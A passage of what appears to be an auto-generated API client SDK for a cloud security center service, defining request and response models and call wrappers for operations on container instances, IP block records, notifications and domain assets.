    type?: string(name='Type', description='The type of the configuration item. Valid values:

*   **webshell_timescan**: webshell detection and removal
*   **aliscriptengine**: in-depth detection engine
*   **alidetect**: installation scope of local file detection
*   **alidetect-scan-enable**: detection scope of local file detection', example='webshell_timescan'),
  }(name='TargetConfig', description='The information about the configuration item.'),
}

model DescribeCommonTargetResultListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCommonTargetResultListResponseBody(name='body'),
}

async function describeCommonTargetResultListWithOptions(request: DescribeCommonTargetResultListRequest, runtime: Util.RuntimeOptions): DescribeCommonTargetResultListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCommonTargetResultList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCommonTargetResultList(request: DescribeCommonTargetResultListRequest): DescribeCommonTargetResultListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCommonTargetResultListWithOptions(request, runtime);
}

model DescribeConcernNecessityRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeConcernNecessityResponseBody = {
  concernNecessity?: [ string ](name='ConcernNecessity', description='The priorities to fix the vulnerabilities. Valid values:

*   asap: high
*   later: medium
*   nntf: low'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
}

model DescribeConcernNecessityResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeConcernNecessityResponseBody(name='body'),
}

async function describeConcernNecessityWithOptions(request: DescribeConcernNecessityRequest, runtime: Util.RuntimeOptions): DescribeConcernNecessityResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeConcernNecessity',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeConcernNecessity(request: DescribeConcernNecessityRequest): DescribeConcernNecessityResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeConcernNecessityWithOptions(request, runtime);
}

model DescribeContainerCriteriaRequest {
  groupField?: string(name='GroupField', example='clusterId'),
  value?: string(name='Value', example='cfb41a869c71e4678a97021582dd8a****'),
}

model DescribeContainerCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='clusterId'),
      type?: string(name='Type', example='input'),
      values?: string(name='Values', example='ManagedKubernetes,NotManagedKubernetes,PrivateKubernetes'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeContainerCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerCriteriaResponseBody(name='body'),
}

async function describeContainerCriteriaWithOptions(request: DescribeContainerCriteriaRequest, runtime: Util.RuntimeOptions): DescribeContainerCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerCriteria(request: DescribeContainerCriteriaRequest): DescribeContainerCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerCriteriaWithOptions(request, runtime);
}

model DescribeContainerInstancesRequest {
  criteria?: string(name='Criteria', example='[{"name":"flag","value":"0|8","logicalExp":"AND"},{"name":"ecsType","value":"!8","logicalExp":"AND"}][{"name":"clusterType","value":"NotManagedKubernetes","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', example='1'),
  logicalExp?: string(name='LogicalExp', example='AND'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeContainerInstancesResponseBody = {
  containerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='1'),
      alarmStatus?: string(name='AlarmStatus', example='YES'),
      appName?: string(name='AppName', example='alibaba-log-controller'),
      clusterId?: string(name='ClusterId', example='cfb41a869c71e4678a97021582dd8a****'),
      clusterName?: string(name='ClusterName', example='test'),
      containerId?: string(name='ContainerId', example='48a6d9a92435a13ad573372c3f3c63b7e04d106458141df9f92155709d****'),
      createTimestamp?: long(name='CreateTimestamp', example='1670368337000'),
      hcCount?: int32(name='HcCount', example='1'),
      hcStatus?: string(name='HcStatus', example='YES'),
      hostIp?: string(name='HostIp', example='172.24.XX.XX'),
      image?: string(name='Image', example='docker.io/library/nginx:latest'),
      imageDigest?: string(name='ImageDigest', example='5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageId?: string(name='ImageId', example='registry-vpc.cn-beijing.aliyuncs.com/acs/log-controller@sha256:5b046e2de8c490819125193ee2eb71a66f2cc16c032dcd8b69ead4be1024****'),
      imageRepoName?: string(name='ImageRepoName', example='log-controller'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', example='acs'),
      imageRepoTag?: string(name='ImageRepoTag', example='0.3.1.0-dfa2010-aliyun'),
      imageUuid?: string(name='ImageUuid', example='5f23dfbceec289a49ac94e035e2****'),
      instanceId?: string(name='InstanceId', example='i-2zegzjyotydfkz9****'),
      namespace?: string(name='Namespace', example='kube-system'),
      nodeInfo?: string(name='NodeInfo', example='test'),
      nodeName?: string(name='NodeName', example='test'),
      pod?: string(name='Pod', example='alibaba-log-controller-6f847f8786-mk2mg'),
      podIp?: string(name='PodIp', example='172.24.XX.XX'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      riskCount?: string(name='RiskCount', example='1'),
      riskStatus?: string(name='RiskStatus', example='YES'),
      updateMark?: string(name='UpdateMark', example='79cff74d-e967-5407-8a78-ee03b9****'),
      vulCount?: int32(name='VulCount', example='15'),
      vulStatus?: string(name='VulStatus', example='YES'),
    }
  ](name='ContainerInstanceList'),
  pageInfo?: {
    count?: int32(name='Count', example='3'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='45'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
}

model DescribeContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerInstancesResponseBody(name='body'),
}

async function describeContainerInstancesWithOptions(request: DescribeContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeContainerInstances(request: DescribeContainerInstancesRequest): DescribeContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerInstancesWithOptions(request, runtime);
}

model DescribeContainerStatisticsRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='Cccfd68c474454665ace07efce924****'),
}

model DescribeContainerStatisticsResponseBody = {
  data?: {
    remindAlarmCount?: int32(name='RemindAlarmCount', description='The number of alerts whose risk level is **Reminder**.', example='1'),
    seriousAlarmCount?: int32(name='SeriousAlarmCount', description='The number of alerts whose risk level is **Urgent**.', example='2'),
    suspiciousAlarmCount?: int32(name='SuspiciousAlarmCount', description='The number of alerts whose risk level is **Suspicious**.', example='3'),
    totalAlarmCount?: int32(name='TotalAlarmCount', description='The total number of alerts that are generated in the current container cluster.', example='6'),
    totalNode?: int32(name='TotalNode', description='The total number of nodes in the current container cluster.', example='12'),
    hasRiskNode?: int32(name='hasRiskNode', description='The number of nodes on which alerts are generated in the current container cluster.', example='4'),
  }(name='Data', description='The alert statistics of container assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='21DA46CA-2DCE-4FF6-907D-D5DBBB7518C8'),
}

model DescribeContainerStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeContainerStatisticsResponseBody(name='body'),
}

/**
  * Only users who created a Container Registry Enterprise Edition instance can call this operation.
  *
  * @param request DescribeContainerStatisticsRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DescribeContainerStatisticsResponse
 */
async function describeContainerStatisticsWithOptions(request: DescribeContainerStatisticsRequest, runtime: Util.RuntimeOptions): DescribeContainerStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeContainerStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * Only users who created a Container Registry Enterprise Edition instance can call this operation.
  *
  * @param request DescribeContainerStatisticsRequest
  * @return DescribeContainerStatisticsResponse
 */
async function describeContainerStatistics(request: DescribeContainerStatisticsRequest): DescribeContainerStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeContainerStatisticsWithOptions(request, runtime);
}

model DescribeCountNotScannedImageResponseBody = {
  notScannedCnt?: int32(name='NotScannedCnt', example='28'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeCountNotScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountNotScannedImageResponseBody(name='body'),
}

async function describeCountNotScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountNotScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountNotScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCountNotScannedImage(): DescribeCountNotScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountNotScannedImageWithOptions(runtime);
}

model DescribeCountScannedImageResponseBody = {
  requestId?: string(name='RequestId', example='3F4236AB-7070-538D-85EB-98EBFE6C****'),
  scannedCount?: int32(name='ScannedCount', example='11'),
}

model DescribeCountScannedImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCountScannedImageResponseBody(name='body'),
}

async function describeCountScannedImageWithOptions(runtime: Util.RuntimeOptions): DescribeCountScannedImageResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeCountScannedImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCountScannedImage(): DescribeCountScannedImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCountScannedImageWithOptions(runtime);
}

model DescribeCriteriaRequest {
  machineTypes?: string(name='MachineTypes', description='The type of the asset. Valid values:

*   **ecs**: Elastic Compute Service (ECS) instance', example='ecs'),
  supportAutoTag?: boolean(name='SupportAutoTag', description='Specifies whether the keyword that you specify for fuzzy search can be automatically matched. default **false**, Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  value?: string(name='Value', description='The keyword that you specify for fuzzy search when you query the asset.', example='47.96'),
}

model DescribeCriteriaResponseBody = {
  criteriaList?: [ 
    {
      multiValues?: string(name='MultiValues', description='The structured attribute values of the assets that match the keyword. The value of this parameter is in the JSON format and contains the following fields:

*   **vendor**: providers
*   **regionIds**: IDs of supported regions', example='[{"vendor":0,"regionIds":{"default":["ap-southeast-1","ap-northeast-2","ap-southeast-3","ap-southeast-5","ap-southeast-7","me-central-1"]}},{"vendor":1,"regionIds":{"default":["outside-of-aliyun"]}}]'),
      name?: string(name='Name', description='The name of the filter condition.', example='internetIp'),
      type?: string(name='Type', description='The type of the filter condition. Valid values:

*   **input**: The filter condition needs to be specified.
*   **select**: The filter condition is an option that can be selected from the drop-down list.', example='input'),
      values?: string(name='Values', description='The attribute values of the assets that match the keyword.', example='47.96.XX.XX'),
    }
  ](name='CriteriaList', description='An array that consists of the filter conditions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='8E6DDACF-99AF-5939-AFFD-FCCD3B01E724'),
}

model DescribeCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCriteriaResponseBody(name='body'),
}

async function describeCriteriaWithOptions(request: DescribeCriteriaRequest, runtime: Util.RuntimeOptions): DescribeCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.supportAutoTag)) {
    query['SupportAutoTag'] = request.supportAutoTag;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCriteria(request: DescribeCriteriaRequest): DescribeCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCriteriaWithOptions(request, runtime);
}

model DescribeCustomBlockRecordsRequest {
  blockIp?: string(name='BlockIp', example='117.66.XX.XX'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', example='1'),
}

model DescribeCustomBlockRecordsResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', example='3'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='708'),
  }(name='PageInfo'),
  recordList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate', example='1671506882063'),
      blockIp?: string(name='BlockIp', example='45.227.XX.XX'),
      bound?: string(name='Bound', example='in'),
      enableCount?: int32(name='EnableCount', example='4'),
      id?: long(name='Id', example='353376'),
      serverCount?: int32(name='ServerCount', example='6'),
      source?: string(name='Source', example='UserRule'),
      status?: int32(name='Status', example='1'),
      targetList?: [ 
        {
          target?: string(name='Target', example='032b618f-b220-4a0d-bd37-fbdc6*******'),
          targetType?: string(name='TargetType', example='uuid'),
        }
      ](name='TargetList'),
    }
  ](name='RecordList'),
  requestId?: string(name='RequestId', example='028CF634-5268-5660-9575-48C9ED6B7T8Y'),
}

model DescribeCustomBlockRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCustomBlockRecordsResponseBody(name='body'),
}

async function describeCustomBlockRecordsWithOptions(request: DescribeCustomBlockRecordsRequest, runtime: Util.RuntimeOptions): DescribeCustomBlockRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCustomBlockRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCustomBlockRecords(request: DescribeCustomBlockRecordsRequest): DescribeCustomBlockRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCustomBlockRecordsWithOptions(request, runtime);
}

model DescribeCycleTaskListRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
  taskName?: string(name='TaskName', example='IMAGE_SCAN'),
  taskType?: string(name='TaskType', example='IMAGE_SCAN'),
}

model DescribeCycleTaskListResponseBody = {
  cycleScheduleResponseList?: [ 
    {
      configId?: string(name='ConfigId', example='2cdbdeba8dd70586d5814d4cbf21****'),
      enable?: int32(name='Enable', example='1'),
      firstDateStr?: long(name='FirstDateStr', example='1667491200000'),
      intervalPeriod?: int32(name='IntervalPeriod', example='3'),
      lastTaskId?: string(name='LastTaskId', example='38730bb078f4a1461d4ed283994c****'),
      nextStartTimeStr?: long(name='NextStartTimeStr', example='1671184531000'),
      param?: string(name='Param', example='{"userAgreement":"yes","lang":"zh"}'),
      periodUnit?: string(name='PeriodUnit', example='day'),
      targetEndTime?: int32(name='TargetEndTime', example='7'),
      targetStartTime?: int32(name='TargetStartTime', example='0'),
      taskName?: string(name='TaskName', example='IMAGE_SCAN'),
      taskType?: string(name='TaskType', example='IMAGE_SCAN'),
    }
  ](name='CycleScheduleResponseList'),
  pageInfo?: {
    count?: int32(name='Count', example='9'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='149'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB393****'),
}

model DescribeCycleTaskListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCycleTaskListResponseBody(name='body'),
}

async function describeCycleTaskListWithOptions(request: DescribeCycleTaskListRequest, runtime: Util.RuntimeOptions): DescribeCycleTaskListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCycleTaskList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCycleTaskList(request: DescribeCycleTaskListRequest): DescribeCycleTaskListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCycleTaskListWithOptions(request, runtime);
}

model DescribeDingTalkRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.Default value: 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.Default value: 20.', example='20'),
  ruleActionName?: string(name='RuleActionName', description='The name of the notification.', example='Vulnerability notification'),
}

model DescribeDingTalkResponseBody = {
  actionList?: [ 
    {
      actionName?: string(name='ActionName', description='The name of the notification.', example='Alert notification'),
      aliUid?: long(name='AliUid', description='The UID of the user.', example='12312412341'),
      configList?: string(name='ConfigList', description='The list of notification settings.', example='[{\\"type\\":\\"vul\\",\\"configItemList\\":[{\\"key\\":\\"key\\", \\"valueList\\":\\"123\\"}]}]'),
      dingTalkLang?: string(name='DingTalkLang', description='The language of the content within notifications. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
      gmtCreate?: long(name='GmtCreate', description='The creation time. unit:millisecond.', example='1550828400000'),
      gmtModified?: long(name='GmtModified', description='The modification time.', example='1550828400000'),
      groupIdList?: string(name='GroupIdList', description='The group IDs.', example='"123,456"'),
      id?: int32(name='Id', description='The ID of the notification.', example='1'),
      intervalTime?: int32(name='IntervalTime', description='The interval at which the notifications are sent.unit:minute.', example='1000'),
      status?: int32(name='Status', description='The status of the notification. Valid values:

*   **0**: disabled
*   **1**: enabled', example='1'),
      url?: string(name='Url', description='The parameters of the notification.', example='https://oapi.dingtalk.com/robot/send'),
    }
  ](name='ActionList', description='An array that consists of details of notifications.'),
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of messages.', example='1'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B256A525-7E42-4BB9-A27C-9017FDDFF1A2'),
}

model DescribeDingTalkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDingTalkResponseBody(name='body'),
}

async function describeDingTalkWithOptions(request: DescribeDingTalkRequest, runtime: Util.RuntimeOptions): DescribeDingTalkResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.ruleActionName)) {
    query['RuleActionName'] = request.ruleActionName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDingTalk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDingTalk(request: DescribeDingTalkRequest): DescribeDingTalkResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDingTalkWithOptions(request, runtime);
}

model DescribeDomainCountRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.172.XX.XX'),
}

model DescribeDomainCountResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C286491D-4A2F-589A-B63B-D2AD3DA9BD71'),
  rootDomainsCount?: int32(name='RootDomainsCount', description='The number of root domains.', example='5'),
  subDomainsCount?: int32(name='SubDomainsCount', description='The number of subdomains.', example='5'),
  totalDomainsCount?: int32(name='TotalDomainsCount', description='The total number of entries returned.', example='10'),
}

model DescribeDomainCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainCountResponseBody(name='body'),
}

async function describeDomainCountWithOptions(request: DescribeDomainCountRequest, runtime: Util.RuntimeOptions): DescribeDomainCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainCount(request: DescribeDomainCountRequest): DescribeDomainCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainCountWithOptions(request, runtime);
}

model DescribeDomainDetailRequest {
  domainName?: string(name='DomainName', description='The domain name or the name of website that you want to query.

>  Fuzzy match is not supported. You must enter a complete domain name or a website.', example='example.com'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
}

model DescribeDomainDetailResponseBody = {
  alarmCount?: int32(name='AlarmCount', description='The total number of alerts in your website assets.', example='2'),
  domain?: string(name='Domain', description='The domain name.', example='example.com'),
  domainDetailItems?: [ 
    {
      assetType?: string(name='AssetType', description='The type of the domain asset. Valid values:

*   **0**: an Elastic Compute Service (ECS) instance
*   **1**: a Server Load Balancer (SLB) instance
*   **2**: a Network Address Translation (NAT) gateway
*   **3**: an ApsaraDB RDS instance
*   **4**: an ApsaraDB for MongoDB instance', example='0'),
      instanceId?: string(name='InstanceId', description='The instance ID of the asset.', example='i-m5e6w7dzsktt6mz4***'),
      instanceName?: string(name='InstanceName', description='The name of the asset.', example='iZm5e6w7dzsktt6mz4yimeZ-6****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the asset.', example='1.2.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the asset.', example='1.2.XX.XX'),
      uuid?: string(name='Uuid', description='The instance UUID of the domain asset.', example='lb-bp1g9dohoyin9cjhn6****'),
    }
  ](name='DomainDetailItems', description='An array that consists of the details about the domain asset.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='3A85CFCF-05C8-451A-9E41-C0D5E96BA407'),
  rootDomain?: string(name='RootDomain', description='The name of the root domain that corresponds to the domain.', example='example.com'),
  vulCount?: int32(name='VulCount', description='The total number of vulnerabilities in your website assets.', example='2'),
}

model DescribeDomainDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainDetailResponseBody(name='body'),
}

async function describeDomainDetailWithOptions(request: DescribeDomainDetailRequest, runtime: Util.RuntimeOptions): DescribeDomainDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.domainName)) {
    query['DomainName'] = request.domainName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainDetail(request: DescribeDomainDetailRequest): DescribeDomainDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainDetailWithOptions(request, runtime);
}

model DescribeDomainListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  domainType?: string(name='DomainType', description='The type of the domain name that you want to query. Valid values:

*   **root**: root domain name
*   **sub**: subdomain name', example='root'),
  fuzzyDomain?: string(name='FuzzyDomain', description='The keyword that is used to query domain names. Fuzzy match is supported.', example='sas'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.122.XX.XX'),
}

model DescribeDomainListResponseBody = {
  domainListResponseList?: [ 
    {
      domain?: string(name='Domain', description='The name of the domain or website.', example='example.com'),
      ipList?: string(name='IpList', description='The IP addresses of the domain name.', example='1.2.XX.XX,1.0.XX.XX'),
    }
  ](name='DomainListResponseList', description='An array that consists of the information about domain names.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='10'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='27'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
}

model DescribeDomainListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeDomainListResponseBody(name='body'),
}

async function describeDomainListWithOptions(request: DescribeDomainListRequest, runtime: Util.RuntimeOptions): DescribeDomainListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.domainType)) {
    query['DomainType'] = request.domainType;
  }
  if (!Util.isUnset(request.fuzzyDomain)) {
